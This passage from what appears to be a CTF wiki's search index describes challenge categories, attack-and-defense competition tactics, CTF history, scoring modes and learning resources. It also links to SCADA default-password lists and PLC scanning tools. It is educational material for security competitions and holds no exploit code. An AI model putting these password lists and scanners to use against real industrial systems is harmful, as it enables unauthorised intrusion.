https://github.com/scadastrangelove/SCADAPASS TOP1 million series weak password https://github.com/danielmiessler/SecLists/tree/master/Passwords","title":"weak password collection"},{"location":"ics/learn/#honey-pot-honeypot","text":"Conpot https://github.com/mushorg/conpot","title":"honey pot honeypot"},{"location":"ics/learn/#using-gadgets","text":"PLC scan discovery tool PLCscan https://code.google.com/archive/p/plcscan/source","title":"Using gadgets"},{"location":"ics/learn/#industrial-control-situational-awareness","text":"[NSA developed industrial control ICS/SCADA situational awareness open source tool Grassmarlin] ( https://github.com/iadgov/grassmarlin )","title":"Industrial Control Situational Awareness"},{"location":"introduction/content/","text":"Because the topics covered in CTF questions are broad, there are no clear boundaries as to what will be tested. Based on the current CTFs questions, topics mainly include these six categories: Web \u2013 Web Application Exploitation , RE - Reverse Engineering , Pwn - Binary Exploitation , Crypto - Cipher Attacks , Mobile - Mobile Security and Misc - Miscellaneous Web \u2013 Web Application Exploitation The Web topic mainly introduces common vulnerabilities in web apps, such as SQL injection, XSS, CSRF, file inclusion, file uploading, code auditing, PHP weaknesses, etc. Also, the common problem types, solving methods, and tools used. RE - Reverse Engineering The RE topic mainly introduces common types of questions seen in RE challenges, reversing platforms, and solving methods. The advanced section introduces software protection, decompilation, anti-reversing, and packing and unpacking techniques. Pwn - Binary Exploitation The Pwn topic mainly introduces the exploitation and utilization of binary vulnerabilities, which requires a understanding of the underlying operating system. In the CTFs, the pwn problems are mainly on Linux. Crypto - Cipher Attacks The Crypto topic mainly includes two parts: classical ciphers and modern cryptography. Classical ciphers are interesting and diverse. Modern cryptography has high security and requires a deeper understanding of the algorithms used. Mobile - Mobile Security The Mobile topic mainly introduces the common tools and problems types in Android reverse engineering. Android reverse engineering often requires some Android development knowledge. IOS reverse problems rarely appear in CTFs, so it won\u2019t be covered. Misc - Miscellaneous The Misc topic mainly includes information gathering, coding, forensics, steganography, and etc. National College Student Information Security Contest - Challenges Topics \u00b6 In 2016, the National College Students Information Security Contest began to hold innovative practical skills competitions, which adopts the traditional CTF competition system. In the \"2016 National College Students Information Security Contest Guide&quot, the following topics are given by the organizer: System security. Involves operating system and web system security, including code audit in multiple languages (especially PHP), database management and SQL operations, web vulnerability discovery and exploit (such as SQL injection and XSS), getting shell on server, patching security vulnerabilities. Reverse engineering. Involves the use of multiple programming languages on Windows/Linux/Android platforms to analyze source code and binary files with tools, Reverse engineering Android mobile application and APK files, encryption and decryption, kernel programming, algorithm, debugging, and code obfuscation technologies. Binary Exploitation. Involves using languages such as C/C++/Python/PHP/Java/Ruby/Assemble, explore Windows/Linux (x86/x86_64 platform) binary bugs, understand buffer overflows and format string attacks, and writing shellcode. Cryptography. Involves classical ciphers and modern cryptography, analyze cryptographic algorithms, calculate keys to perform encryption and decryption operations. Miscellaneous. Involves information gathering, programming, mobile security, cloud computing security, trusted computing, autonomous controllable, steganography, forensics, file recovery, computer network foundation, and network traffic analysis.","title":"CTF Competition Topics"},{"location":"introduction/content/#national-college-student-information-security-contest-challenges-topics","text":"In 2016, the National College Students Information Security Contest began to hold innovative practical skills competitions, which adopts the traditional CTF competition system. In the \"2016 National College Students Information Security Contest Guide&quot, the following topics are given by the organizer: System security. Involves operating system and web system security, including code audit in multiple languages (especially PHP), database management and SQL operations, web vulnerability discovery and exploit (such as SQL injection and XSS), getting shell on server, patching security vulnerabilities. Reverse engineering. Involves the use of multiple programming languages on Windows/Linux/Android platforms to analyze source code and binary files with tools, Reverse engineering Android mobile application and APK files, encryption and decryption, kernel programming, algorithm, debugging, and code obfuscation technologies. Binary Exploitation. Involves using languages such as C/C++/Python/PHP/Java/Ruby/Assemble, explore Windows/Linux (x86/x86_64 platform) binary bugs, understand buffer overflows and format string attacks, and writing shellcode. Cryptography. Involves classical ciphers and modern cryptography, analyze cryptographic algorithms, calculate keys to perform encryption and decryption operations. Miscellaneous. Involves information gathering, programming, mobile security, cloud computing security, trusted computing, autonomous controllable, steganography, forensics, file recovery, computer network foundation, and network traffic analysis.","title":"National College Student Information Security Contest - Challenges Topics"},{"location":"introduction/experience/","text":"First, the competition will provide a portal to submit flags. The URL of the portal is like this: http://172.16.4.1/Common/submitAnswer . We need to use the information in the document to connect to the portal and submit flags. To submit flags, you need to use HTTP Post method with two parameters. One parameter answer is value of the flag, the other parameter token is value of the team's token. During the competition, the organizer will also provide each participating team with a virtual machine for analyzing network traffic , and players need to download the network traffic file and analyze it. Pay attention to the Gamebox's status \u00b6 In the competition, you can check your own and your opponent's Gamebox status during a match. Paying attention to the status so you can pick up information early and adjust based on that information. There are several reasons why your GameBox is down: There was an error in the organizer's system that incorrectly displayed the Gamebox\u2019s status. In this case, problems can normally be discovered before the competition. If you found issues in organizer's system, inform staff as early as possible to minimize damage. The patch program can accidentally cause the service to be unavailable. Check the Gamebox\u2019s status after the patch, if the service is unavailable, fix it immediately. You don't worry about replacing it with an unpatched service/program since when the service is down, teams won't lose too many points. However, the unpatched service/program will be exploited by top teams to obtain more points. You need to deal with this type of situation on a case-by-case basis. Teams might use illegitimate attack methods that will bring down the Gamebox, if discovered, fix it immediately. The organizer modifies the check program. In that case, the organizer will notify all the teams. You will a majority of the Gamebox are unavailable. You can get the following information about the opponent\u2019s Gamebox: Determine which teams failed to defend their GameBox based on network traffic. So, more attacks can be made against these teams. When a team gets First Blood, you can tell if the First Blood team used an exploit based on each teams\u2019 Gamebox status. Furthermore, you can see which team's defense didn't work. Knowing the network segment and ports \u00b6 During the competition, the organizer will assigned a network segment. In maintenance, your team must be on the assigned network segment to connect to the Gamebox. Then login based on the CTF username and password provided. This network segment will allow you interact with another team\u2019s Gamebox and vulnerable programs. Warning Here you must pay close attention to the port. If a port is mistyped or mistaken, then it might bring unnecessary problems, like unable to submit flags. Mistyping the port is hard to detect. So, you should double-check and make sure the port is correct. Service patch and defense \u00b6 The patch program needs to meet the judge\u2019s system check requirements. Even though what the system check actually checks are not disclosed, it\u2019s not too difficult to pass. Use IDA to modify the patch program. IDA provides 3 ways to patch: byte, word, assemble. The byte method is easy to use since you don\u2019t need assembly instructions. Generally, such modification is also very small and efficient. Assembly instruction-level modifications, while convenient without the need to modify the bytecode, can also cause some inconvenience. For example, having to worry about the length of the assembly instruction, if the structure is complete, and whether the logic and modified instruction are correct, etc. Remember to back up the vulnerable program before the patch for team analysis. Before updating the patch, remove the vulnerable program. Then, copy the patch and give it proper permissions. In general, there are around ten locations that need to patch in the vulnerable program. The patch should not only be effective but also add protection or confusion to your opponent's analysis Use a Script to Attack Quickly \u00b6 Fast attack scripts can maintain the advantage position in the early stage. At the same time getting points and saving time for defending. Some Tricks Used in the Competition \u00b6 During the competition, don\u2019t spend too long on a single question. Because of the advantage you get for obtaining First Blood, you should understand the overall difficulty of challenges. Start from the easier question and work your way up. During the competition, you should try to attack teams that are similar or above your skill level. especially if they have around the same score as your team. Remember to buff up your defense. During the competition, NPC (non-player characters) will randomly send your attack traffic. In the attack traffic, the payload can be obtained. Be sure to attack the NPC. At the beginning of the competition, you can change all the passwords to one password. That way, it\u2019s easier to share and use. Also, back up all the files given and share them with the team.","title":"Attack and Defense Experience Summary"},{"location":"introduction/experience/#pay-attention-to-the-gameboxs-status","text":"In the competition, you can check your own and your opponent's Gamebox status during a match. Paying attention to the status so you can pick up information early and adjust based on that information. There are several reasons why your GameBox is down: There was an error in the organizer's system that incorrectly displayed the Gamebox\u2019s status. In this case, problems can normally be discovered before the competition. If you found issues in organizer's system, inform staff as early as possible to minimize damage. The patch program can accidentally cause the service to be unavailable. Check the Gamebox\u2019s status after the patch, if the service is unavailable, fix it immediately. You don't worry about replacing it with an unpatched service/program since when the service is down, teams won't lose too many points. However, the unpatched service/program will be exploited by top teams to obtain more points. You need to deal with this type of situation on a case-by-case basis. Teams might use illegitimate attack methods that will bring down the Gamebox, if discovered, fix it immediately. The organizer modifies the check program. In that case, the organizer will notify all the teams. You will a majority of the Gamebox are unavailable. You can get the following information about the opponent\u2019s Gamebox: Determine which teams failed to defend their GameBox based on network traffic. So, more attacks can be made against these teams. When a team gets First Blood, you can tell if the First Blood team used an exploit based on each teams\u2019 Gamebox status. Furthermore, you can see which team's defense didn't work.","title":"Pay attention to the Gamebox's status"},{"location":"introduction/experience/#knowing-the-network-segment-and-ports","text":"During the competition, the organizer will assigned a network segment. In maintenance, your team must be on the assigned network segment to connect to the Gamebox. Then login based on the CTF username and password provided. This network segment will allow you interact with another team\u2019s Gamebox and vulnerable programs. Warning Here you must pay close attention to the port. If a port is mistyped or mistaken, then it might bring unnecessary problems, like unable to submit flags. Mistyping the port is hard to detect. So, you should double-check and make sure the port is correct.","title":"Knowing the network segment and ports"},{"location":"introduction/experience/#service-patch-and-defense","text":"The patch program needs to meet the judge\u2019s system check requirements. Even though what the system check actually checks are not disclosed, it\u2019s not too difficult to pass. Use IDA to modify the patch program. IDA provides 3 ways to patch: byte, word, assemble. The byte method is easy to use since you don\u2019t need assembly instructions. Generally, such modification is also very small and efficient. Assembly instruction-level modifications, while convenient without the need to modify the bytecode, can also cause some inconvenience. For example, having to worry about the length of the assembly instruction, if the structure is complete, and whether the logic and modified instruction are correct, etc. Remember to back up the vulnerable program before the patch for team analysis. Before updating the patch, remove the vulnerable program. Then, copy the patch and give it proper permissions. In general, there are around ten locations that need to patch in the vulnerable program. The patch should not only be effective but also add protection or confusion to your opponent's analysis","title":"Service patch and defense"},{"location":"introduction/experience/#use-a-script-to-attack-quickly","text":"Fast attack scripts can maintain the advantage position in the early stage. At the same time getting points and saving time for defending.","title":"Use a Script to Attack Quickly"},{"location":"introduction/experience/#some-tricks-used-in-the-competition","text":"During the competition, don\u2019t spend too long on a single question. Because of the advantage you get for obtaining First Blood, you should understand the overall difficulty of challenges. Start from the easier question and work your way up. During the competition, you should try to attack teams that are similar or above your skill level. especially if they have around the same score as your team. Remember to buff up your defense. During the competition, NPC (non-player characters) will randomly send your attack traffic. In the attack traffic, the payload can be obtained. Be sure to attack the NPC. At the beginning of the competition, you can change all the passwords to one password. That way, it\u2019s easier to share and use. Also, back up all the files given and share them with the team.","title":"Some Tricks Used in the Competition"},{"location":"introduction/history/","text":"The content of this column is taken from the public video \"The Past, Present and Future of CTF\" by Teacher Zhuge Jianwei in the Spring Festival. Origin of CTF \u00b6 CTF originated from the competition game between hackers in the fourth DEFCON in 1996. Early Years of CTF \u00b6 The first CTF (1996-2001) has no clear rules, no professionally built platform or environment. Each team prepares their own objective (defending their own objective, while attacking opponents' objective). Most of the organizers are just enthusiastic non-professional volunteers who assist in manual scoring. Great controversy and dissatisfaction were due to the lack of an automated scoring system and technical competence among judges, many scoring delays and errors, unreliable network, and improper configuration. \"Modern\" CTF Competition \u00b6 A professional organizer will manage the competition platform, create challenges, and implement competitions with an automated scoring system. The participating teams are required to apply for participation and will be selected by the organizers of the DEFCON in a meeting. During the three years with LegitBS organizing the DEFCON CTF competition, a few modifications have been made: The competition focuses on the inner workings of the computers, its security features and capabilities. Web exploitation has been completely ignored. Various CPU architectures, operating systems, and languages. The \"Zero-Sum\" scoring rule. A wider skillset required: reverse engineering, vulnerability discovery, pwning, patching, network traffic analysis, system security, programming and debugging.","title":"CTF History"},{"location":"introduction/history/#origin-of-ctf","text":"CTF originated from the competition game between hackers in the fourth DEFCON in 1996.","title":"Origin of CTF"},{"location":"introduction/history/#early-years-of-ctf","text":"The first CTF (1996-2001) has no clear rules, no professionally built platform or environment. Each team prepares their own objective (defending their own objective, while attacking opponents' objective). Most of the organizers are just enthusiastic non-professional volunteers who assist in manual scoring. Great controversy and dissatisfaction were due to the lack of an automated scoring system and technical competence among judges, many scoring delays and errors, unreliable network, and improper configuration.","title":"Early Years of CTF"},{"location":"introduction/history/#modern-ctf-competition","text":"A professional organizer will manage the competition platform, create challenges, and implement competitions with an automated scoring system. The participating teams are required to apply for participation and will be selected by the organizers of the DEFCON in a meeting. During the three years with LegitBS organizing the DEFCON CTF competition, a few modifications have been made: The competition focuses on the inner workings of the computers, its security features and capabilities. Web exploitation has been completely ignored. Various CPU architectures, operating systems, and languages. The \"Zero-Sum\" scoring rule. A wider skillset required: reverse engineering, vulnerability discovery, pwning, patching, network traffic analysis, system security, programming and debugging.","title":"\"Modern\" CTF Competition"},{"location":"introduction/mode/","text":"Problem Solving Mode - Jeopardy \u00b6 The problem-solving type (Jeopardy) is a common format in online CTF competitions. In a Jeopardy CTF, the participating teams can participate through the Internet or the on-site network. Furthermore, teams can use the online environment to communicate and share files, solve technical challenges, and submit the answers to score points. What\u2019s different in Jeopardy is that the first three teams that solve a challenge get rewarded with extra points. Generally, the first three solves are referred to as first blood, second blood, and third blood. This scoring format not only rewards teams who can solve the challenge quickly, but also shows teamwork through collaboration. Of course, there is another popular way of scoring, where the number of points a challenge worth is determined by the number of teams that successfully solve the challenge. Initially, A challenge is given reward points. As more teams successfully solve a challenge, that challenge\u2019s total points reward decreases. Lastly, the reward points will stop decreasing once a hits a threshold. In CTF, topics mainly include these six categories Web \u2013 Web Application Exploitation , RE - Reverse Engineering , Pwn - Binary Exploitation , Crypto - Cipher Attacks , Mobile - Mobile Security and Misc - Miscellaneous War Sharing Mode - Belluminar \u00b6 In the 2016 World Hacking Masters Challenge (WCTF), China was first introduced to the Belluminar CTF. Since then, Belluminar type of CTFs has been slowly popping up. In 2016, this type of competition has been seen in the XMan Summer Camp by Zhuge Jianwei and the Baidu Cup CTF Competition in September of the same year. Here is the official Belluminar website: http://belluminar.org/ Introduction to the Belluminar System \u00b6 Belluminar, hacking contest of POC, started at POC2015 in KOREA for the first time. Belluminar is from 'Bellum'(war in Latin) and 'seminar'. It is not a just hacking contest but a kind of festival consisted of CTF & seminar for the solution about challenges. Only invited teams can join Belluminar. Each team can show its ability to attack what other teams want to protect and can defend what others want to attack. Stage of Making the Challenges \u00b6 Each team is required to submit 2 challenges to the challenge bank. First, each invited team must submit a question before the official competition. The teams will have 12 weeks to prepare the questions for the challenges. The score of the challenges made accounted for 30% of the total team score. Challenge 1: must be on the Linux platform; Challenge 2: No platform restriction(except Linux) No challenge type restriction (Pwn, Reverse...) Traditional Belluminar systems require each team to make two challenges. One of the challenges must be in Linux, while the other has no platform or challenge type restriction. Therefore, teams can show their skill and creativity. In order to make the types of challenges more balanced, teams have to draw for their challenge type. This requires the team's skill level to be more comprehensive. In order to maintain balance, the two challenges might have different scores (For example, one might need to be the score of 200, while the other be the score of 100). Submitting Challenges \u00b6 Before submitting the challenges, teams must submit a full document and a solve writeup for the challenges. The document must include the challenge name and score, challenge description, challenge creator, knowledge needed, and source code of the challenge. However, the solve write-up only needs to include the operating environment, full solving process, and solve script/code. After the challenges are submitted, the organizers will test the challenges and code. If issues are found, the person responsible for the challenge must help to solve the problems. Then, the challenges can be put on the competition platform. During the Competition \u00b6 After entering the competition, each team can request to solve the other team\u2019s challenge. If they can\u2019t solve the challenge, they will not get the First Blood reward. The ranking is based on the accumulated points earned by solving the challenges; points earned from challenges account for 60% of the overall points. Share Discussion After the Competition \u00b6 After the game is over, the team rests and creates PowerPoints (can also be done in the challenge creation phase). During the sharing meeting, each team sends two members to share their intended solutions, learning process, knowledge points, etc. Once the presentative is over, open discussion begins. The two team representatives must answer questions from other players or judges. While they don\u2019t have a time limit on answering questions, however, the time used is a variable in the scoring process. Scoring Rules \u00b6 Scores from creating challenges (30% of overall score) \u2013 50% of the points are based on the level of details, completion, submit time, and the other 50% of the points coms from solved challenges. The formula is as follows: Score = MaxScore -- | N -- Expect\uff3fN | N is the number of teams that solved this challenge. Expect\uff3fN is the number of teams expected to solve this challenge. Only when the challenge\u2019s difficulty is balanced, the number of teams solved this challenge will be closer to the number of teams expected to solve this challenge, the challenge\u2019s creator will earn more points. Score from solving challenges (60% of overall score) \u2013 First Blood is not included in the calculation. Score from sharing \u2013 (10% of overall score) \u2013 Scores based on the content during the sharing meeting voted by players and judges (account for the time taken and other restrictions), will be calculated as an average. Thoughts on the Belluminar System \u00b6 The Belluminar system handed over the responsibility of creating challenges to the invited teams, where each team do their best to create challenges for each other. The difficulty and scope of the competition will not be restricted by the organizer, so the quality of the challenges will improve. The \u201cSharing\u201d phase allows each team to explain their challenges. The open discussion process enables the sharing of creative ideas/methods. The \u201cSharing\u201d phase after the competition is a great way for others players to learn. Attack and Defense Mode - Attack & Defense \u00b6 Overview \u00b6 The finals of Attack and Defense competitions are usually done offline. In Attack and Defense mode, teams will use the same system environment, often referred to as the \u201cGamebox\u201d. On the attacking side, teams need to discover vulnerabilities on services running on the opponent\u2019s machine, then exploit them to score by obtaining the flag. On the defending side, teams need to patch existing vulnerabilities to stop losing points (usually defending and patching are the only way to stop losing points, of course, in some competitions successful defending can be rewarded with points). An Attack and Defend competition not only tests the team\u2019s technical skills but also tests the players' body (since most competitions last about 48 hours). At the same time, team members need to split up the tasks and work together on solving different problems. Usually, the competition organizer will disclose the details on the requirements 30 minutes or 1 day before the competition. During that time, you cannot attack. You need to get familiar with the given environment and prepare to defend based on the given requirements. You will need to discover the opponent Gamebox\u2019s IP address using the given subnet. If the two Attack and Defend sessions are between morning and afternoon, then the vulnerable services will get changed (in case players talk about them during the break). However, the IP address and what will not change. Normally, the organizer will provide ethernet cables, but not ethernet adopters. Basic Rules \u00b6 The general rules of attack and defense mode are as follows The teams will start with x points During each round, the organizer will update which service contains the released flag. During each round, if a team\u2019s vulnerable service and the attacker obtained the flag via the vulnerable service, then the team will lose some points and the attacker will gain some points. During each round, if a team can keep the its services running normally, then that team won\u2019t lose points. (if defended successful, the points will be rewarded) If a team\u2019s service goes down, then the team will lose points, which distributed to teams that had their service running normally. Often, service downtime and errors will result in more deduction of points. If all teams\u2019 service goes down during a round and it is determined to be unavoidable. Then, no points will be deducted. During each round, if a service goes down and a team gets the flag, the team responsible for the service may get deduct double the points. The uses of general defense methods are forbidden. The participating teams should backup all services before the competition. If a service gets lost or damaged, the organizer will not restore it. It is forbidden to attack the competition platform, including but not limited obtaining root in Gameebox. The offender immediately banned from the competing. If the team finds violations of other teams, please report them immediately and we will strictly review and make corresponding judgments. Network Environment \u00b6 The document will usually contain a network topology map (as shown below). Each team will maintain some Gamebox (one\u2019s own server), vulnerable services are deployed on the Gamebox. The document will include the area of the players, the attack and defense zone, and the organizer\u2019s or third party\u2019s environment. Players needs to configure or use DHCP to obtain the following: IP address Gateway Subnet DNS server address Attack and defense environment The IP addresses of their own and the other teams' Gamebox. The competition usually provides a table of team ids with their corresponding IP address to make planning easier. Organizer environment Competition platform Submit flag portal Traffic dashboard Gamebox Login \u00b6 The document provides the login details. Normally, it's like the following: Username is ctf Login to SSH using a password or private key Default passwords should be changed immediately and weak passwords should not be used.","title":"CTF Competition Types"},{"location":"introduction/mode/#problem-solving-mode-jeopardy","text":"The problem-solving type (Jeopardy) is a common format in online CTF competitions. In a Jeopardy CTF, the participating teams can participate through the Internet or the on-site network. Furthermore, teams can use the online environment to communicate and share files, solve technical challenges, and submit the answers to score points. What\u2019s different in Jeopardy is that the first three teams that solve a challenge get rewarded with extra points. Generally, the first three solves are referred to as first blood, second blood, and third blood. This scoring format not only rewards teams who can solve the challenge quickly, but also shows teamwork through collaboration. Of course, there is another popular way of scoring, where the number of points a challenge worth is determined by the number of teams that successfully solve the challenge. Initially, A challenge is given reward points. As more teams successfully solve a challenge, that challenge\u2019s total points reward decreases. Lastly, the reward points will stop decreasing once a hits a threshold. In CTF, topics mainly include these six categories Web \u2013 Web Application Exploitation , RE - Reverse Engineering , Pwn - Binary Exploitation , Crypto - Cipher Attacks , Mobile - Mobile Security and Misc - Miscellaneous","title":"Problem Solving Mode - Jeopardy"},{"location":"introduction/mode/#war-sharing-mode-belluminar","text":"In the 2016 World Hacking Masters Challenge (WCTF), China was first introduced to the Belluminar CTF. Since then, Belluminar type of CTFs has been slowly popping up. In 2016, this type of competition has been seen in the XMan Summer Camp by Zhuge Jianwei and the Baidu Cup CTF Competition in September of the same year. Here is the official Belluminar website: http://belluminar.org/","title":"War Sharing Mode - Belluminar"},{"location":"introduction/mode/#introduction-to-the-belluminar-system","text":"Belluminar, hacking contest of POC, started at POC2015 in KOREA for the first time. Belluminar is from 'Bellum'(war in Latin) and 'seminar'. It is not a just hacking contest but a kind of festival consisted of CTF & seminar for the solution about challenges. Only invited teams can join Belluminar. Each team can show its ability to attack what other teams want to protect and can defend what others want to attack.","title":"Introduction to the Belluminar System"},{"location":"introduction/mode/#stage-of-making-the-challenges","text":"Each team is required to submit 2 challenges to the challenge bank. First, each invited team must submit a question before the official competition. The teams will have 12 weeks to prepare the questions for the challenges. The score of the challenges made accounted for 30% of the total team score. Challenge 1: must be on the Linux platform; Challenge 2: No platform restriction(except Linux) No challenge type restriction (Pwn, Reverse...) Traditional Belluminar systems require each team to make two challenges. One of the challenges must be in Linux, while the other has no platform or challenge type restriction. Therefore, teams can show their skill and creativity. In order to make the types of challenges more balanced, teams have to draw for their challenge type. This requires the team's skill level to be more comprehensive. In order to maintain balance, the two challenges might have different scores (For example, one might need to be the score of 200, while the other be the score of 100).","title":"Stage of Making the Challenges"},{"location":"introduction/mode/#submitting-challenges","text":"Before submitting the challenges, teams must submit a full document and a solve writeup for the challenges. The document must include the challenge name and score, challenge description, challenge creator, knowledge needed, and source code of the challenge. However, the solve write-up only needs to include the operating environment, full solving process, and solve script/code. After the challenges are submitted, the organizers will test the challenges and code. If issues are found, the person responsible for the challenge must help to solve the problems. Then, the challenges can be put on the competition platform.","title":"Submitting Challenges"},{"location":"introduction/mode/#during-the-competition","text":"After entering the competition, each team can request to solve the other team\u2019s challenge. If they can\u2019t solve the challenge, they will not get the First Blood reward. The ranking is based on the accumulated points earned by solving the challenges; points earned from challenges account for 60% of the overall points.","title":"During the Competition"},{"location":"introduction/mode/#share-discussion-after-the-competition","text":"After the game is over, the team rests and creates PowerPoints (can also be done in the challenge creation phase). During the sharing meeting, each team sends two members to share their intended solutions, learning process, knowledge points, etc. Once the presentative is over, open discussion begins. The two team representatives must answer questions from other players or judges. While they don\u2019t have a time limit on answering questions, however, the time used is a variable in the scoring process.","title":"Share Discussion After the Competition"},{"location":"introduction/mode/#scoring-rules","text":"Scores from creating challenges (30% of overall score) \u2013 50% of the points are based on the level of details, completion, submit time, and the other 50% of the points coms from solved challenges. The formula is as follows: Score = MaxScore -- | N -- Expect\uff3fN | N is the number of teams that solved this challenge. Expect\uff3fN is the number of teams expected to solve this challenge. Only when the challenge\u2019s difficulty is balanced, the number of teams solved this challenge will be closer to the number of teams expected to solve this challenge, the challenge\u2019s creator will earn more points. Score from solving challenges (60% of overall score) \u2013 First Blood is not included in the calculation. Score from sharing \u2013 (10% of overall score) \u2013 Scores based on the content during the sharing meeting voted by players and judges (account for the time taken and other restrictions), will be calculated as an average.","title":"Scoring Rules"},{"location":"introduction/mode/#thoughts-on-the-belluminar-system","text":"The Belluminar system handed over the responsibility of creating challenges to the invited teams, where each team do their best to create challenges for each other. The difficulty and scope of the competition will not be restricted by the organizer, so the quality of the challenges will improve. The \u201cSharing\u201d phase allows each team to explain their challenges. The open discussion process enables the sharing of creative ideas/methods. The \u201cSharing\u201d phase after the competition is a great way for others players to learn.","title":"Thoughts on the Belluminar System"},{"location":"introduction/mode/#attack-and-defense-mode-attack-defense","text":"","title":"Attack and Defense Mode - Attack &amp; Defense"},{"location":"introduction/mode/#overview","text":"The finals of Attack and Defense competitions are usually done offline. In Attack and Defense mode, teams will use the same system environment, often referred to as the \u201cGamebox\u201d. On the attacking side, teams need to discover vulnerabilities on services running on the opponent\u2019s machine, then exploit them to score by obtaining the flag. On the defending side, teams need to patch existing vulnerabilities to stop losing points (usually defending and patching are the only way to stop losing points, of course, in some competitions successful defending can be rewarded with points). An Attack and Defend competition not only tests the team\u2019s technical skills but also tests the players' body (since most competitions last about 48 hours). At the same time, team members need to split up the tasks and work together on solving different problems. Usually, the competition organizer will disclose the details on the requirements 30 minutes or 1 day before the competition. During that time, you cannot attack. You need to get familiar with the given environment and prepare to defend based on the given requirements. You will need to discover the opponent Gamebox\u2019s IP address using the given subnet. If the two Attack and Defend sessions are between morning and afternoon, then the vulnerable services will get changed (in case players talk about them during the break). However, the IP address and what will not change. Normally, the organizer will provide ethernet cables, but not ethernet adopters.","title":"Overview"},{"location":"introduction/mode/#basic-rules","text":"The general rules of attack and defense mode are as follows The teams will start with x points During each round, the organizer will update which service contains the released flag. During each round, if a team\u2019s vulnerable service and the attacker obtained the flag via the vulnerable service, then the team will lose some points and the attacker will gain some points. During each round, if a team can keep the its services running normally, then that team won\u2019t lose points. (if defended successful, the points will be rewarded) If a team\u2019s service goes down, then the team will lose points, which distributed to teams that had their service running normally. Often, service downtime and errors will result in more deduction of points. If all teams\u2019 service goes down during a round and it is determined to be unavoidable. Then, no points will be deducted. During each round, if a service goes down and a team gets the flag, the team responsible for the service may get deduct double the points. The uses of general defense methods are forbidden. The participating teams should backup all services before the competition. If a service gets lost or damaged, the organizer will not restore it. It is forbidden to attack the competition platform, including but not limited obtaining root in Gameebox. The offender immediately banned from the competing. If the team finds violations of other teams, please report them immediately and we will strictly review and make corresponding judgments.","title":"Basic Rules"},{"location":"introduction/mode/#network-environment","text":"The document will usually contain a network topology map (as shown below). Each team will maintain some Gamebox (one\u2019s own server), vulnerable services are deployed on the Gamebox. The document will include the area of the players, the attack and defense zone, and the organizer\u2019s or third party\u2019s environment. Players needs to configure or use DHCP to obtain the following: IP address Gateway Subnet DNS server address Attack and defense environment The IP addresses of their own and the other teams' Gamebox. The competition usually provides a table of team ids with their corresponding IP address to make planning easier. Organizer environment Competition platform Submit flag portal Traffic dashboard","title":"Network Environment"},{"location":"introduction/mode/#gamebox-login","text":"The document provides the login details. Normally, it's like the following: Username is ctf Login to SSH using a password or private key Default passwords should be changed immediately and weak passwords should not be used.","title":"Gamebox Login"},{"location":"introduction/resources/","text":"e-learning \u00b6 [i Spring and Autumn - Professional Network Security | Information Security Online Learning Training Platform] ( http://www.ichunqiu.com ) Experiment it - make the experiment easier! [Look at the Snow Knowledge Base] ( https://www.kanxue.com/chm.htm ) Learning route \u00b6 [Know the Chuangyu R&D Skills Table v3.1] ( http://blog.knownsec.com/Knownsec_RD_Checklist/index.html ) [Bugbank Bank Skills Tree] ( https://skills.bugbank.cn/ ) [Security Skills Tree Lite by Cosine] ( http://evilcos.me/security_skill_tree_basic/index.html ) [Safety mind map by phith0n] ( https://github.com/phith0n/Mind-Map ) [Information Security Practitioner Book Recommendation] ( https://github.com/riusksk/secbook ) Information \u00b6 [FreeBuf.COM | Focus on Hackers and Geeks] ( http://www.freebuf.com/ ) [Safety Guest - Thoughtful Security New Media] ( https://www.anquanke.com/ ) [\u5636\u543cRoarTalk \u2013 Return to the most essential information security] ( http://www.4hou.com/ ) [Sec-News Security Digest] ( https://wiki.ioin.in/ ) technology Forum \u00b6 [My Love Crack] ( http://www.52pojie.cn ) [Look at Snow Forum] ( http://bbs.pediy.com/ ) [Prophet Community] ( https://xz.aliyun.com/ ) [i Spring and Autumn Forum] ( https://bbs.ichunqiu.com/ ) CTF Events \u00b6 [XCTF Community] ( https://www.xctf.org.cn/ ) CTFtime CTF Rank CTF OJ \u00b6 XCTF OJ [CTF Base Camp] ( https://www.ichunqiu.com/competition ) pwnhub [Southern Mail Network Attack and Defense Training Platform] ( http://ctf.nuptsast.com/ ) [HackingLab Network Information Security Attack and Defense Learning Platform] ( http://hackinglab.cn/ ) BugkuCTF WeChall Sniper OJ [Jarvis OJ] ( https://www.jarvisoj.com/ ) CTF Learn Hackme CTF Practice CTF List CTF Tools \u00b6 [Look at Snow Tools] ( https://tools.pediy.com/ ) [My Love Crack Tool] ( https://down.52pojie.cn/Tools/ ) [CTF online tool by CTFcode] ( http://ctf.ssleye.com/ ) [CTF online toolbox by bugku] ( http://tool.bugku.com/ ) [CTF Tools Resource Library by HBCTF team] ( https://ctftools.com/down/ ) ctf-tools by zardus The Cyber Swiss Army Knife CTF Writeup \u00b6 [CTFs Writeup Collection] ( https://github.com/ctfs ) CTF solution by p4 team","title":"Learning Resources"},{"location":"introduction/resources/#e-learning","text":"[i Spring and Autumn - Professional Network Security | Information Security Online Learning Training Platform] ( http://www.ichunqiu.com ) Experiment it - make the experiment easier! [Look at the Snow Knowledge Base] ( https://www.kanxue.com/chm.htm )","title":"e-learning"},{"location":"introduction/resources/#learning-route","text":"[Know the Chuangyu R&D Skills Table v3.1] ( http://blog.knownsec.com/Knownsec_RD_Checklist/index.html ) [Bugbank Bank Skills Tree] ( https://skills.bugbank.cn/ ) [Security Skills Tree Lite by Cosine] ( http://evilcos.me/security_skill_tree_basic/index.html ) [Safety mind map by phith0n] ( https://github.com/phith0n/Mind-Map ) [Information Security Practitioner Book Recommendation] ( https://github.com/riusksk/secbook )","title":"Learning route"},{"location":"introduction/resources/#information","text":"[FreeBuf.COM | Focus on Hackers and Geeks] ( http://www.freebuf.com/ ) [Safety Guest - Thoughtful Security New Media] ( https://www.anquanke.com/ ) [\u5636\u543cRoarTalk \u2013 Return to the most essential information security] ( http://www.4hou.com/ ) [Sec-News Security Digest] ( https://wiki.ioin.in/ )","title":"Information"},{"location":"introduction/resources/#technology-forum","text":"[My Love Crack] ( http://www.52pojie.cn ) [Look at Snow Forum] ( http://bbs.pediy.com/ ) [Prophet Community] ( https://xz.aliyun.com/ ) [i Spring and Autumn Forum] ( https://bbs.ichunqiu.com/ )","title":"technology Forum"},{"location":"introduction/resources/#ctf-events","text":"[XCTF Community] ( https://www.xctf.org.cn/ ) CTFtime CTF Rank","title":"CTF Events"},{"location":"introduction/resources/#ctf-oj","text":"XCTF OJ [CTF Base Camp] ( https://www.ichunqiu.com/competition ) pwnhub [Southern Mail Network Attack and Defense Training Platform] ( http://ctf.nuptsast.com/ ) [HackingLab Network Information Security Attack and Defense Learning Platform] ( http://hackinglab.cn/ ) BugkuCTF WeChall Sniper 